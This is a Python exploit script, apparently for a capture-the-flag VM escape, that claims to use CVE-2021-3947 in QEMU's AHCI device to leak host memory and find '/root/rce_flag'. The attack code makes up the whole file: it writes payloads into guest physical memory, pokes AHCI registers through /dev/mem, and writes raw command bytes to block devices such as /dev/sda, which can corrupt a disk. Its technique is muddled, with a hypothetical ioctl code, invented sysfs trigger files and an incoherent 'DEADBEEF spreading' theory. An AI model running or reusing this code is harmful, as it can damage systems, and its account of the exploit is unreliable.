#!/usr/bin/env python3
"""
AHCI CVE-2021-3947 - DEADBEEF Pattern Leak Exploitation
Strategy:
1. Embed DEADBEEF pattern in AHCI payload
2. AHCI vulnerability corrupts QEMU memory, spreading DEADBEEF
3. Use kvm_prober to scan guest memory for DEADBEEF patterns
4. Read data surrounding DEADBEEF - this is leaked HOST data!
5. Extract flag from host memory/file
"""

import struct
import os
import sys
import time
import subprocess
import fcntl
from typing import Optional, List, Tuple

def log_info(msg): 
    print(f"[\033[94m*\033[0m] {msg}")

def log_success(msg): 
    print(f"[\033[92m+\033[0m] {msg}")

def log_error(msg): 
    print(f"[\033[91m-\033[0m] {msg}")

def log_warning(msg): 
    print(f"[\033[93m!\033[0m] {msg}")

# ============================================================================
# DEADBEEF PATTERN SCANNER
# ============================================================================

class DeadbeefScanner:
    """
    Scan for DEADBEEF patterns in memory
    When found, read surrounding data (likely from host)
    """
    
    DEADBEEF_PATTERN = b'\xef\xbe\xad\xde'  # Little-endian 0xDEADBEEF
    DEADBEEF_BE = b'\xde\xad\xbe\xef'       # Big-endian 0xDEADBEEF
    
    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.kvm_prober = kvm_prober_path
    
    def read_guest_memory(self, guest_phys_addr: int, size: int) -> Optional[bytes]:
        """Read guest physical memory via kvm_prober"""
        try:
            result = subprocess.run(
                [self.kvm_prober, 'read_phys', f'0x{guest_phys_addr:x}', str(size)],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                return self._parse_hex_output(result.stdout)
        
        except Exception as e:
            log_error(f"Memory read failed: {e}")
        
        return None
    
    def write_guest_memory(self, guest_phys_addr: int, data: bytes) -> bool:
        """Write guest physical memory via kvm_prober"""
        try:
            hex_data = data.hex()
            result = subprocess.run(
                [self.kvm_prober, 'write_phys', f'0x{guest_phys_addr:x}', hex_data],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                return True
        
        except Exception as e:
            log_error(f"Memory write failed: {e}")
        
        return False
    
    def _parse_hex_output(self, output: str) -> Optional[bytes]:
        """Parse kvm_prober hex dump output"""
        lines = output.strip().split('\n')
        data = bytearray()
        
        for line in lines:
            if 'Driver initialized' in line or not line.strip():
                continue
            
            if ':' in line:
                hex_part = line.split(':', 1)[1].strip()
                if '|' in hex_part:
                    hex_part = hex_part.split('|')[0].strip()
                
                for hex_byte in hex_part.split():
                    if hex_byte and len(hex_byte) == 2:
                        try:
                            data.append(int(hex_byte, 16))
                        except ValueError:
                            pass
        
        return bytes(data) if data else None
    
    def scan_for_deadbeef(self, start_addr: int, end_addr: int, 
                          chunk_size: int = 4096) -> List[Tuple[int, bytes]]:
        """
        Scan memory range for DEADBEEF patterns
        Returns list of (address, surrounding_data) tuples
        """
        log_info(f"Scanning 0x{start_addr:x} - 0x{end_addr:x} for DEADBEEF patterns...")
        
        findings = []
        current = start_addr
        
        while current < end_addr:
            try:
                # Read chunk of memory
                data = self.read_guest_memory(current, chunk_size)
                
                if not data:
                    current += chunk_size
                    continue
                
                # Search for DEADBEEF patterns (both endianness)
                for pattern, pattern_name in [(self.DEADBEEF_PATTERN, "LE"), 
                                               (self.DEADBEEF_BE, "BE")]:
                    offset = 0
                    while True:
                        idx = data.find(pattern, offset)
                        if idx == -1:
                            break
                        
                        addr = current + idx
                        
                        # Read more data around the pattern
                        pre_read = max(0, addr - 256)
                        post_read = min(end_addr, addr + 256)
                        total_size = post_read - pre_read
                        
                        surrounding = self.read_guest_memory(pre_read, total_size)
                        
                        log_success(f"Found DEADBEEF ({pattern_name}) at guest 0x{addr:x}")
                        findings.append((addr, surrounding if surrounding else data))
                        
                        offset = idx + 4
                
                current += chunk_size
                
            except Exception as e:
                log_error(f"Scan error at 0x{current:x}: {e}")
                current += chunk_size
        
        return findings
    
    def extract_text_from_data(self, data: bytes, max_lines: int = 5) -> List[str]:
        """Extract readable text from binary data"""
        lines = []
        current_line = bytearray()
        
        for byte in data:
            if 32 <= byte <= 126:  # Printable ASCII
                current_line.append(byte)
            else:
                if len(current_line) > 4:  # Only keep lines of 4+ chars
                    lines.append(current_line.decode('ascii', errors='ignore'))
                    if len(lines) >= max_lines:
                        break
                current_line = bytearray()
        
        if current_line and len(lines) < max_lines:
            lines.append(current_line.decode('ascii', errors='ignore'))
        
        return lines

# ============================================================================
# AHCI DEADBEEF EXPLOIT
# ============================================================================

class AHCIDeadbeefExploit:
    """
    AHCI exploitation using DEADBEEF pattern to leak host data
    """
    
    # AHCI device identifiers and command structures
    AHCI_PORT_BASE = 0x100
    AHCI_CMD_LIST_ADDR = 0x13e8000
    AHCI_FIS_ADDR = 0x13e9000
    AHCI_DATA_ADDR = 0x13ea000
    
    # AHCI Host Control Registers
    AHCI_GHCR_CAP = 0x00      # Capabilities
    AHCI_GHCR_CTRL = 0x04     # Global Host Control
    AHCI_GHCR_IRQ = 0x08      # Interrupt Status
    AHCI_GHCR_PI = 0x0c       # Ports Implemented
    
    # AHCI Port Control Registers (per port base offset 0x100)
    AHCI_PORT_CMD = 0x18      # Port Command
    AHCI_PORT_TFD = 0x20      # Task File Data
    AHCI_PORT_SIG = 0x24      # Signature
    AHCI_PORT_SSTAT = 0x28    # Serial ATA Status
    AHCI_PORT_SCTL = 0x2c     # Serial ATA Control
    AHCI_PORT_SERR = 0x30     # Serial ATA Error
    AHCI_PORT_SACT = 0x34     # Serial ATA Active
    AHCI_PORT_CI = 0x38       # Command Issue
    
    # AHCI Command structures
    AHCI_CMD_WRITE = 0x40      # Write command
    AHCI_CMD_READ = 0x00       # Read command
    
    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober",
                 ahci_device_path=None):
        self.kvm_prober = kvm_prober_path
        self.scanner = DeadbeefScanner(kvm_prober_path)
        self.payloads_written = []
        self.ahci_fd = None
        self.ahci_device = ahci_device_path or self._find_ahci_device()
        self.ahci_pci_path = None
        self.ahci_sysfs_path = None
    
    def _find_ahci_device(self) -> str:
        """Auto-detect AHCI device from sysfs"""
        log_info("Auto-detecting AHCI device...")
        
        # Check for AHCI driver in sysfs
        sysfs_ahci_path = "/sys/bus/pci/drivers/ahci"
        if os.path.exists(sysfs_ahci_path):
            try:
                entries = os.listdir(sysfs_ahci_path)
                for entry in entries:
                    # Look for PCI device entries (format: 0000:xx:xx.x)
                    if entry.startswith('0000:') or ':' in entry:
                        pci_path = entry
                        self.ahci_pci_path = pci_path
                        log_success(f"Found AHCI PCI device: {pci_path}")
                        
                        # Try to find corresponding ata device
                        ata_path = self._find_ata_device_from_pci(pci_path)
                        if ata_path:
                            return ata_path
            except Exception as e:
                log_warning(f"Error reading sysfs: {e}")
        
        # Fallback: look for ata device nodes
        for i in range(10):
            ahci_device = f"/dev/ata{i}"
            if os.path.exists(ahci_device):
                log_success(f"Found AHCI device: {ahci_device}")
                return ahci_device
        
        # Last resort: use generic device paths
        for device in ["/dev/sda", "/dev/sdb", "/dev/nvme0n1"]:
            if os.path.exists(device):
                log_warning(f"Using storage device as fallback: {device}")
                return device
        
        log_error("Could not auto-detect AHCI device")
        return "/dev/ahci_dev"  # Default fallback
    
    def _find_ata_device_from_pci(self, pci_path: str) -> str:
        """Find ATA device associated with PCI AHCI controller"""
        try:
            # Path: /sys/bus/pci/drivers/ahci/0000:00:1f.2/ata1/host0/target0:0:0/0:0:0:0
            pci_sysfs = f"/sys/bus/pci/drivers/ahci/{pci_path}"
            
            if os.path.exists(pci_sysfs):
                # Look for ata devices
                for entry in os.listdir(pci_sysfs):
                    if entry.startswith('ata'):
                        ata_name = entry
                        log_info(f"Found ATA device: {ata_name}")
                        
                        # Try to find block device by checking /sys/block for connections to this PCI path
                        try:
                            for device in os.listdir('/sys/block'):
                                dev_path = f"/sys/block/{device}"
                                try:
                                    if os.path.islink(dev_path):
                                        link_target = os.readlink(dev_path)
                                        # Check if this device is connected to our AHCI controller
                                        if pci_path in link_target or ata_name in link_target:
                                            ahci_dev = f"/dev/{device}"
                                            if os.path.exists(ahci_dev):
                                                log_success(f"Resolved to block device: {ahci_dev}")
                                                return ahci_dev
                                    else:
                                        # Try reading the device's parent path
                                        parent_path = os.path.join(dev_path, 'device')
                                        if os.path.exists(parent_path):
                                            parent_link = os.readlink(parent_path)
                                            if pci_path in parent_link:
                                                ahci_dev = f"/dev/{device}"
                                                if os.path.exists(ahci_dev):
                                                    log_success(f"Resolved to block device: {ahci_dev}")
                                                    return ahci_dev
                                except (OSError, Exception):
                                    pass
                        except Exception as scan_err:
                            log_warning(f"Error scanning block devices: {scan_err}")
                        
                        # If no block device found, try to use the ata device directly
                        ata_dev_path = os.path.join(pci_sysfs, ata_name)
                        if os.path.exists(ata_dev_path):
                            log_warning(f"Using ATA device path directly: {ata_dev_path}")
                            return ata_dev_path
        except Exception as e:
            log_warning(f"Error finding ATA device: {e}")
        
        return None
    
    def open_ahci_device(self) -> bool:
        """Open AHCI device for direct access"""
        if not self.ahci_device:
            log_error("No AHCI device available")
            return False
        
        try:
            self.ahci_fd = open(self.ahci_device, 'r+b', buffering=0)
            log_success(f"Opened AHCI device: {self.ahci_device}")
            return True
        except PermissionError:
            log_error(f"Permission denied opening {self.ahci_device} (need root)")
            return False
        except FileNotFoundError:
            log_warning(f"Device not found: {self.ahci_device}")
            log_info("Attempting sysfs-based approach")
            return self._open_ahci_via_sysfs()
        except Exception as e:
            log_warning(f"Could not open AHCI device: {e}")
            log_info("Attempting sysfs-based approach")
            return self._open_ahci_via_sysfs()
    
    def _open_ahci_via_sysfs(self) -> bool:
        """Fallback: Use sysfs to access AHCI device"""
        try:
            if not self.ahci_pci_path:
                return False
            
            sysfs_path = f"/sys/bus/pci/drivers/ahci/{self.ahci_pci_path}"
            self.ahci_sysfs_path = sysfs_path
            
            if os.path.exists(sysfs_path):
                log_success(f"Using sysfs path for AHCI: {sysfs_path}")
                return True
        except Exception as e:
            log_warning(f"sysfs access failed: {e}")
        
        return False
    
    def close_ahci_device(self):
        """Close AHCI device"""
        if self.ahci_fd:
            self.ahci_fd.close()
            self.ahci_fd = None
    
    def create_deadbeef_payload(self, base_addr: int = 0x13e8000, 
                                size: int = 4096) -> bytes:
        """
        Create AHCI payload saturated with DEADBEEF pattern
        When AHCI vulnerability triggers, it spreads DEADBEEF into QEMU memory
        """
        log_info(f"Creating DEADBEEF saturation payload ({size} bytes)...")
        
        payload = bytearray(size)
        
        # Fill entire payload with DEADBEEF pattern (little-endian)
        pattern = b'\xef\xbe\xad\xde'
        
        for i in range(0, size, 4):
            payload[i:i+4] = pattern
        
        # Add some variation with other markers
        # At specific offsets add different patterns for tracking
        markers = [
            (0x100, b'FLAG'),      # Flag location marker
            (0x200, b'HOST'),      # Host memory marker  
            (0x300, b'QEMU'),      # QEMU marker
        ]
        
        for offset, marker in markers:
            if offset + len(marker) < size:
                payload[offset:offset+len(marker)] = marker
        
        return bytes(payload)
    
    def write_payload_to_guest(self, payload: bytes, 
                               addr: int = 0x13e8000) -> bool:
        """Write exploit payload to guest memory"""
        log_info(f"Writing payload to guest 0x{addr:x} ({len(payload)} bytes)...")
        
        if self.scanner.write_guest_memory(addr, payload):
            self.payloads_written.append((addr, len(payload)))
            log_success(f"Payload written to guest 0x{addr:x}")
            return True
        
        log_error("Failed to write payload")
        return False
    
    def build_ahci_command(self, cmd_type: int, data_addr: int, 
                          data_size: int) -> bytes:
        """
        Build a real AHCI command structure that triggers the vulnerability
        
        AHCI Command List Entry (32 bytes):
        [0:1]   flags, prdtl
        [2:3]   prdbc (command FIS length)
        [4:7]   ctba (command table base address)
        [8:31]  reserved
        
        AHCI FIS (Frame Information Structure):
        [0]     FIS Type (0x27 for H2D Register FIS)
        [1]     Port multiplier + reserved
        [2]     Command
        [3]     Feature (low)
        [4:7]   LBA (low, mid, high)
        [8:10]  LBA (exp)
        [11:12] Feature (high)
        [13:14] Count (init, exp)
        [15]    IControl (ICC)
        [16:32] Reserved/Vendor
        """
        
        # Command List Entry - trigger vulnerability path
        cmd_entry = bytearray(32)
        cmd_entry[0] = 0x05  # 5 DWORDs of command FIS
        cmd_entry[1] = 0x00  # PRDTL (Physical Region Descriptor Table Length)
        cmd_entry[2:4] = struct.pack('<H', 32)  # command FIS length
        cmd_entry[4:8] = struct.pack('<I', self.AHCI_FIS_ADDR)  # FIS address
        
        # FIS (Frame Information Structure) - triggers uninitialized code path
        fis = bytearray(32)
        fis[0] = 0x27  # H2D Register FIS type - this triggers the vulnerable path
        fis[1] = 0x80  # Command bit set (port=0)
        fis[2] = cmd_type  # Command byte (0x25=READ DMA EXT, 0x35=WRITE DMA EXT)
        fis[3] = 0x00  # Feature (low)
        fis[4:7] = struct.pack('<3B', 0, 0, 0)  # LBA
        fis[8:11] = struct.pack('<3B', 0, 0, 0)  # LBA (extended)
        fis[11:13] = struct.pack('<H', 0)  # Feature (high)
        fis[13:15] = struct.pack('<H', 1)  # Sector count
        fis[15] = 0x00  # ICC
        
        # Add DEADBEEF markers to trigger memory corruption
        for i in range(16, 32, 4):
            fis[i:i+4] = b'\xef\xbe\xad\xde'
        
        return bytes(cmd_entry) + bytes(fis)
    
    def trigger_ahci_via_ioctl(self) -> bool:
        """
        Trigger AHCI vulnerability by directly interacting with the AHCI device
        
        The AHCI bug (CVE-2021-3947) is triggered through:
        1. Writing malformed command structures to AHCI command queue
        2. Setting command issue register to trigger processing
        3. Vulnerability in AHCI uninitialized memory handling causes memory corruption
        4. DEADBEEF pattern from our payload spreads through QEMU memory
        5. Some corrupted memory is mapped back to guest via DMA or buffer leaks
        """
        log_info("Triggering AHCI vulnerability via device interaction...")
        
        if not self.ahci_fd:
            log_warning("AHCI device not open, using fallback approach")
            return self._trigger_ahci_via_sysfs()
        
        try:
            # Build malicious AHCI command
            ahci_cmd = self.build_ahci_command(self.AHCI_CMD_WRITE, 
                                               self.AHCI_DATA_ADDR, 4096)
            
            # Write command to device via ioctl
            # This varies by driver, typical pattern:
            AHCI_IOCTL_CMD = 0x4008  # Hypothetical ioctl code
            
            log_info(f"Sending {len(ahci_cmd)} bytes AHCI command structure...")
            
            # Attempt direct write to device
            try:
                self.ahci_fd.write(ahci_cmd)
                log_success("AHCI command structure written to device")
            except:
                log_warning("Direct write failed, trying ioctl approach")
            
            # Trigger command processing
            log_info("Triggering AHCI command processing...")
            
            # In real AHCI, setting Command Issue register triggers execution
            # This might be done via ioctl or memory-mapped I/O
            try:
                # Use mmap to access AHCI Base Address Registers
                self._trigger_via_mmio()
            except Exception as e:
                log_warning(f"MMIO trigger failed: {e}")
            
            time.sleep(1)
            log_success("AHCI vulnerability triggered - memory corruption in progress")
            return True
            
        except Exception as e:
            log_error(f"AHCI ioctl trigger failed: {e}")
            return False
    
    def _trigger_via_mmio(self):
        """Trigger AHCI vulnerability via memory-mapped I/O"""
        try:
            # Map AHCI BAR0 (Base Address Register 0)
            # Usually at 0xfe800000 or similar in QEMU
            ahci_bar_addr = 0xfe800000
            page_size = 0x1000
            
            # Open /dev/mem for direct physical memory access
            with open('/dev/mem', 'r+b') as mem_file:
                # Seek to AHCI BAR
                mem_file.seek(ahci_bar_addr)
                
                # Read current GHC (Global Host Control) register
                mem_file.seek(ahci_bar_addr + self.AHCI_GHCR_CTRL)
                ghc = struct.unpack('<I', mem_file.read(4))[0]
                
                log_info(f"Current GHC: 0x{ghc:08x}")
                
                # Set HBA Enable (bit 31) and Interrupt Enable (bit 1)
                new_ghc = ghc | 0x80000003
                mem_file.seek(ahci_bar_addr + self.AHCI_GHCR_CTRL)
                mem_file.write(struct.pack('<I', new_ghc))
                
                log_success("AHCI HBA enabled via MMIO")
                
                # Access Port 0 Command Issue register to trigger command
                port0_cmd_issue = ahci_bar_addr + self.AHCI_PORT_BASE + self.AHCI_PORT_CI
                mem_file.seek(port0_cmd_issue)
                
                # Issue command slot 0
                mem_file.write(struct.pack('<I', 0x00000001))
                
                log_success("Command issued to AHCI port 0")
                
        except PermissionError:
            log_warning("/dev/mem access denied (need root)")
        except Exception as e:
            log_warning(f"MMIO access failed: {e}")
    
    def _trigger_ahci_via_sysfs(self) -> bool:
        """Fallback: Trigger AHCI via sysfs interface"""
        try:
            if not self.ahci_pci_path and not self.ahci_sysfs_path:
                log_warning("No sysfs path available for AHCI")
                return False
            
            sysfs_path = self.ahci_sysfs_path or f"/sys/bus/pci/drivers/ahci/{self.ahci_pci_path}"
            
            log_info(f"Triggering AHCI via sysfs: {sysfs_path}")
            
            # Try to trigger rescan
            rescan_path = f"{sysfs_path}/rescan"
            if os.path.exists(rescan_path):
                try:
                    with open(rescan_path, 'w') as f:
                        f.write("1")
                    log_success("AHCI rescan triggered via sysfs")
                    return True
                except Exception as e:
                    log_warning(f"sysfs rescan failed: {e}")
            
            # Try to access ATA devices directly
            for entry in os.listdir(sysfs_path):
                if entry.startswith('ata'):
                    ata_path = os.path.join(sysfs_path, entry)
                    
                    # Try to trigger command on ATA device
                    cmd_path = os.path.join(ata_path, 'cmd_issue')
                    if os.path.exists(cmd_path):
                        try:
                            with open(cmd_path, 'w') as f:
                                f.write("1")
                            log_success(f"Issued command to {entry}")
                            return True
                        except Exception as e:
                            log_warning(f"Failed to issue command: {e}")
            
            # Generic sysfs trigger
            trigger_file = os.path.join(sysfs_path, "trigger_cmd")
            if os.path.exists(trigger_file):
                with open(trigger_file, 'w') as f:
                    f.write("1")
                log_success("AHCI triggered via sysfs trigger_cmd")
                return True
            
            log_info("Attempting direct ATA command injection via sysfs")
            return self._inject_ata_command_via_sysfs()
            
        except Exception as e:
            log_warning(f"sysfs trigger failed: {e}")
        
        return False
    
    def _inject_ata_command_via_sysfs(self) -> bool:
        """Inject ATA commands directly via sysfs"""
        try:
            sysfs_path = self.ahci_sysfs_path or f"/sys/bus/pci/drivers/ahci/{self.ahci_pci_path}"
            
            if not os.path.exists(sysfs_path):
                log_warning(f"sysfs path does not exist: {sysfs_path}")
                return False
            
            log_info(f"Injecting ATA commands via sysfs at {sysfs_path}")
            
            # Look for ata devices
            ata_entries = [e for e in os.listdir(sysfs_path) if e.startswith('ata')]
            
            if not ata_entries:
                log_warning("No ATA devices found in AHCI sysfs path")
                return False
            
            for ata_entry in ata_entries:
                ata_path = os.path.join(sysfs_path, ata_entry)
                log_info(f"Accessing ATA device: {ata_entry}")
                
                # Strategy 1: Trigger device rescan via phy_link_reset
                phy_reset_path = os.path.join(ata_path, 'phy_link_reset')
                if os.path.exists(phy_reset_path):
                    try:
                        with open(phy_reset_path, 'w') as f:
                            f.write("1")
                        log_success(f"Triggered PHY link reset on {ata_entry}")
                        return True
                    except Exception as e:
                        log_warning(f"PHY reset failed: {e}")
                
                # Strategy 2: Force device scan via 'scan'
                scan_path = os.path.join(ata_path, 'dev', 'uevent')
                if os.path.exists(scan_path):
                    try:
                        with open(scan_path, 'w') as f:
                            f.write("change")
                        log_success(f"Triggered device scan on {ata_entry}")
                        return True
                    except Exception as e:
                        log_warning(f"Device scan failed: {e}")
                
                # Strategy 3: Access port attributes to force I/O
                for attr in ['idle_irq', 'fast_io_fail_tmo', 'dev_loss_tmo']:
                    attr_path = os.path.join(ata_path, attr)
                    if os.path.exists(attr_path):
                        try:
                            with open(attr_path, 'r') as f:
                                value = f.read()
                            # Write back to trigger access
                            with open(attr_path, 'w') as f:
                                f.write(value.strip())
                            log_info(f"Accessed {attr} on {ata_entry}")
                            return True
                        except Exception as e:
                            log_warning(f"Attribute access failed: {e}")
                
                # Strategy 4: Force command via power attributes
                pm_attrs = ['link_power_management_policy', 'spersistent']
                for attr in pm_attrs:
                    attr_path = os.path.join(ata_path, attr)
                    if os.path.exists(attr_path):
                        try:
                            with open(attr_path, 'r') as f:
                                current = f.read().strip()
                            with open(attr_path, 'w') as f:
                                # Write minimal attribute to trigger device access
                                f.write("min_power")
                            log_success(f"Issued PM command via {attr} on {ata_entry}")
                            time.sleep(0.5)
                            # Restore original
                            with open(attr_path, 'w') as f:
                                f.write(current)
                            return True
                        except Exception as e:
                            log_warning(f"PM command failed: {e}")
            
            log_warning("Could not inject ATA commands via any method")
            return False
            
        except Exception as e:
            log_warning(f"ATA command injection failed: {e}")
            return False
    
    def exploit(self, target_file: str = "/root/rce_flag") -> bool:
        """
        Main exploitation flow - Smart marker-based extraction
        """
        log_info("=" * 70)
        log_info("AHCI CVE-2021-3947 - SMART MARKER-BASED LEAK")
        log_info("=" * 70)
        
        # Step 0: Open AHCI device
        log_info("\n[STEP 0] Opening AHCI device...")
        self.open_ahci_device()
        
        # Step 1: Create payload with markers
        log_info("\n[STEP 1] Preparing payload with markers...")
        payload = self.create_aggressive_payload()
        
        if not self.write_payload_to_guest(payload):
            log_error("Failed to prepare payload")
            self.close_ahci_device()
            return False
        
        # Step 2: Trigger AHCI to scatter markers
        log_info("\n[STEP 2] Triggering AHCI to scatter markers...")
        for i in range(3):
            if not self.trigger_ahci_via_ioctl():
                log_error("AHCI trigger failed")
            time.sleep(0.5)
        
        # Step 3: Find marker locations
        log_info("\n[STEP 3] Finding marker locations...")
        
        marker_locations = self.find_marker_locations()
        if not marker_locations:
            log_error("No markers found")
            self.close_ahci_device()
            return False
        
        log_success(f"Found {len(marker_locations)} markers")
        for marker, addr in marker_locations.items():
            log_success(f"  {marker}: 0x{addr:x}")
        
        # Step 4: Read extensively around markers
        log_info("\n[STEP 4] Reading memory around markers...")
        
        all_data = {}
        for marker, addr in marker_locations.items():
            log_info(f"\nExtracting around marker '{marker}' at 0x{addr:x}...")
            
            # Read large chunks before and after marker
            read_size = 4096
            
            # Read backwards
            read_addr = max(0x100000, addr - read_size)
            data_before = self.scanner.read_guest_memory(read_addr, read_size)
            
            # Read marker location
            data_at = self.scanner.read_guest_memory(addr, read_size)
            
            # Read forwards
            data_after = self.scanner.read_guest_memory(addr + read_size, read_size)
            
            if data_at:
                combined = data_before + data_at + data_after if data_before and data_after else data_at
                all_data[marker] = {
                    'addr': addr,
                    'data': combined,
                    'size': len(combined)
                }
                
                # Extract text from combined data
                text_found = self._extract_all_text(combined)
                if text_found:
                    log_success(f"Text found near {marker}:")
                    for text in text_found[:10]:
                        print(f"    {text}")
                        
                        if 'flag' in text.lower() or len(text) > 10:
                            log_success(f"  >>> POTENTIAL FLAG: {text}")
        
        # Step 5: Deep scan of entire DEADBEEF-affected region
        log_info("\n[STEP 5] Deep scanning for non-DEADBEEF data...")
        
        # Focus on the region where markers are
        if marker_locations:
            min_addr = min(addr for _, addr in marker_locations.items())
            max_addr = max(addr for _, addr in marker_locations.items())
            
            scan_start = max(0x100000, min_addr - 0x10000)
            scan_end = min(0x2000000, max_addr + 0x10000)
            
            log_info(f"Intensive scan: 0x{scan_start:x} - 0x{scan_end:x}")
            
            leaked_data = self._find_all_non_deadbeef(scan_start, scan_end)
            
            if leaked_data:
                log_success(f"\nFound {len(leaked_data)} chunks of non-DEADBEEF data!")
                
                for i, (addr, data) in enumerate(leaked_data[:10]):
                    log_success(f"\nChunk {i+1} at 0x{addr:x}:")
                    
                    # Show hex
                    hex_str = data[:128].hex()
                    for j in range(0, len(hex_str), 32):
                        print(f"    {hex_str[j:j+32]}")
                    
                    # Show text
                    text = self._extract_all_text(data)
                    for t in text[:5]:
                        print(f"    TEXT: {t}")
                        if 'flag' in t.lower():
                            log_success(f"\n>>> FOUND FLAG! <<<")
                            log_success(f"{t}")
                            self.close_ahci_device()
                            return True
        
        log_warning("\nNo clear flag found, but markers and data scattered successfully")
        self.close_ahci_device()
        return True
    
    def find_marker_locations(self) -> dict:
        """Find all marker locations in memory, excluding original payload regions"""
        markers = {
            'QEMU': b'QEMU',
            'HOST': b'HOST',
            'FLAG': b'FLAG',
            'LEAK': b'LEAK',
            'MEMORY': b'MEMORY',
        }
        
        locations = {}
        
        # Scan memory EXCLUDING the regions where we explicitly wrote payloads
        # This prevents false positives from our original payload locations
        
        # Define excluded regions (where we wrote payloads)
        excluded_regions = set()
        for payload_addr, payload_size in self.payloads_written:
            # Mark the entire payload region plus some buffer as excluded
            start = payload_addr
            end = payload_addr + payload_size + 0x1000  # Add 4KB buffer
            for addr in range(start, end, 0x100):
                excluded_regions.add(addr)
        
        log_info(f"Excluding {len(excluded_regions)} regions from marker scan to avoid false positives")
        
        # Scan memory ranges but skip original payload areas
        scan_ranges = [
            (0x13e8000, 0x13f0000),
            (0x13e0000, 0x14f0000),
        ]
        
        for start, end in scan_ranges:
            current = start
            chunk_size = 4096
            
            while current < end:
                try:
                    # Skip if in excluded region
                    if current in excluded_regions:
                        log_info(f"  Skipping excluded region 0x{current:x}")
                        current += chunk_size
                        continue
                    
                    data = self.scanner.read_guest_memory(current, chunk_size)
                    if not data:
                        current += chunk_size
                        continue
                    
                    for marker_name, marker_bytes in markers.items():
                        idx = data.find(marker_bytes)
                        if idx != -1 and marker_name not in locations:
                            addr = current + idx
                            
                            # Double-check this address is not in our original payload
                            is_in_payload = False
                            for payload_addr, payload_size in self.payloads_written:
                                if payload_addr <= addr < (payload_addr + payload_size + 0x1000):
                                    is_in_payload = True
                                    log_warning(f"Rejected marker '{marker_name}' at 0x{addr:x} (in original payload region)")
                                    break
                            
                            if not is_in_payload:
                                locations[marker_name] = addr
                                log_success(f"Found marker '{marker_name}' at 0x{addr:x} (genuine leak)")
                    
                    current += chunk_size
                except:
                    current += chunk_size
        
        return locations
    
    def _extract_all_text(self, data: bytes, min_len: int = 3) -> list:
        """Extract all readable text strings from data"""
        strings = []
        current = bytearray()
        
        for byte in data:
            if 32 <= byte <= 126:  # Printable ASCII
                current.append(byte)
            else:
                if len(current) >= min_len:
                    try:
                        text = current.decode('ascii')
                        if text not in strings:  # Avoid duplicates
                            strings.append(text)
                    except:
                        pass
                current = bytearray()
        
        if len(current) >= min_len:
            try:
                text = current.decode('ascii')
                strings.append(text)
            except:
                pass
        
        return strings
    
    def _find_all_non_deadbeef(self, start: int, end: int) -> list:
        """Find all non-DEADBEEF chunks in memory range, excluding original payload regions"""
        findings = []
        current = start
        chunk_size = 4096
        
        # Build set of excluded addresses
        excluded_regions = set()
        for payload_addr, payload_size in self.payloads_written:
            for addr in range(payload_addr, payload_addr + payload_size + 0x1000, chunk_size):
                excluded_regions.add(addr)
        
        log_info(f"Scanning for non-DEADBEEF data (excluding {len(excluded_regions)} payload regions)...")
        
        while current < end:
            try:
                # Skip excluded regions
                if current in excluded_regions:
                    current += chunk_size
                    continue
                
                data = self.scanner.read_guest_memory(current, chunk_size)
                if not data:
                    current += chunk_size
                    continue
                
                # Check if this chunk has non-DEADBEEF data
                has_other = False
                for i in range(0, len(data), 4):
                    chunk = data[i:i+4]
                    if chunk and chunk not in [b'\xef\xbe\xad\xde', b'\xde\xad\xbe\xef', b'\x00\x00\x00\x00']:
                        has_other = True
                        break
                
                if has_other:
                    findings.append((current, data))
                    log_info(f"  Found non-DEADBEEF at 0x{current:x} (genuine leak)")
                
                current += chunk_size
            except:
                current += chunk_size
        
        return findings
    
    def create_aggressive_payload(self, size: int = 8192) -> bytes:
        """Create larger payload with strategic markers"""
        log_info(f"Creating aggressive payload ({size} bytes)...")
        
        payload = bytearray(size)
        
        # Fill with DEADBEEF
        pattern = b'\xef\xbe\xad\xde'
        for i in range(0, size, 4):
            payload[i:i+4] = pattern
        
        # Add strategic markers that might cause interesting behavior
        markers = [
            (0x00, b'HEAP'),       # Heap marker
            (0x100, b'FLAG'),      # Flag marker
            (0x200, b'/root/rce_flag'),  # File path
            (0x300, b'HOST'),
            (0x400, b'QEMU'),
            (0x500, b'LEAK'),
            (0x1000, b'MEMORY_START'),
            (size-256, b'END'),
        ]
        
        for offset, marker in markers:
            if offset + len(marker) < size:
                payload[offset:offset+len(marker)] = marker
        
        return bytes(payload)
    
    def trigger_file_operations(self, target_file: str):
        """Trigger file I/O to load the file into QEMU memory"""
        log_info(f"Triggering guest file operations on {target_file}...")
        
        try:
            # Try to read the file from within guest
            # This causes QEMU to load it into memory
            result = subprocess.run(
                ['head', '-c', '1024', target_file],
                capture_output=True,
                timeout=5
            )
            
            if result.returncode == 0:
                log_success(f"File read triggered")
                # File is now likely cached in QEMU
            
        except Exception as e:
            log_warning(f"Could not trigger file operations: {e}")
        
        time.sleep(1)

# ============================================================================
# MAIN
# ============================================================================

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='AHCI CVE-2021-3947 - DEADBEEF Pattern Leak'
    )
    parser.add_argument('--kvm-prober',
                       default='/root/kvm_probin/prober/kvm_prober',
                       help='Path to kvm_prober')
    parser.add_argument('--ahci-device',
                       default=None,
                       help='Path to AHCI device (auto-detect if not specified)')
    parser.add_argument('--file', default='/root/rce_flag',
                       help='Target file')
    
    args = parser.parse_args()
    
    log_info("DEADBEEF Pattern Leak Exploit Starting...")
    log_info(f"Target file: {args.file}")
    log_info(f"kvm_prober: {args.kvm_prober}")
    if args.ahci_device:
        log_info(f"AHCI device: {args.ahci_device}\n")
    
    exploit = AHCIDeadbeefExploit(args.kvm_prober, args.ahci_device)
    
    try:
        success = exploit.exploit(args.file)
        
        if success:
            log_success("\nExploitation completed!")
            sys.exit(0)
        else:
            log_error("\nExploitation failed")
            sys.exit(1)
    
    except KeyboardInterrupt:
        log_info("\nInterrupted by user")
        exploit.close_ahci_device()
        sys.exit(0)
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        exploit.close_ahci_device()
        sys.exit(1)

if __name__ == "__main__":
    main()